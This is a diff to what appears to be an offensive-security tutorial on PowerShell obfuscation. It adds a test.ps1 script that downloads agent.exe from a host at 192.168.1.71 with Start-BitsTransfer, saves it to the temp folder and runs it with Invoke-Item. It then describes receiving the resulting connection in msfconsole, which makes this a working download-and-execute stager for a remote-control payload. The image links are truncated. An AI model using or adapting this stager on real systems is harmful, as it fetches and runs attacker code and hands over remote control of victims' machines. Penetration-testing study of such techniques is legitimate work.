@@ -562,15 +562,18 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 <br />
 
+- File **test.ps1** (trigger download/execution)
+
       Import-Module BitsTransfer
       $path = [environment]::getfolderpath("temp")
       Start-BitsTransfer -Source "http://192.168.1.71/agent.exe" -Destination "$path\agent.exe"
+      Invoke-Item "$path\agent.exe" #<-- trigger agent execution
 
-![powershell obfuscation Start-BitsTransfer](http://i.)
+![powershell obfuscation test.ps1](http://i.)
 
-      Invoke-Item "$path\agent.exe"
+- Recibing the connection in msfconsole 
 
-![powershell obfuscation Invoke-item-msfconsole](http://i.)
+![powershell obfuscation msfconsole](http://i.)
 
 ---
 
